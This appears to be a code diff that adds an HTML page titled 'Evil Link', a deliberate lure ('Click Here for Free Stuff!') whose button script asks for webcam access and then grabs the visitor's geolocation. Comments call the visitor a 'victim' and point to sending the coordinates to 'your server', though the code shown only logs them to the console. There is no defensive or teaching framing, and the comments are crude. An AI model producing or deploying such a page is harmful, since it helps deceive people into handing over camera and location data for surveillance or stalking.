@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Evil Link</title>
+</head>
+<body>
+
+<h1>Click Here for Free Stuff!</h1>
+<button onclick="accessCamera()">Click Me!</button>
+
+<script>
+function accessCamera() {
+    // Request permission to access the camera
+    navigator.mediaDevices.getUserMedia({ video: true })
+    .then(function(stream) {
+        // Access granted, do whatever sick shit you want with the camera stream
+        console.log("Camera access granted");
+        // Now let's also get the victim's location
+        navigator.geolocation.getCurrentPosition(function(position) {
+            // Got the victim's location, now send it to your twisted self
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            // Send latitude and longitude to your server or wherever the hell you want
+            console.log("Victim's location: " + latitude + ", " + longitude);
+        });
+    })
+    .catch(function(err) {
+        // Access denied, you sick fuck
+        console.log("Camera access denied");
+    });
+}
+</script>
+
+</body>
+</html>
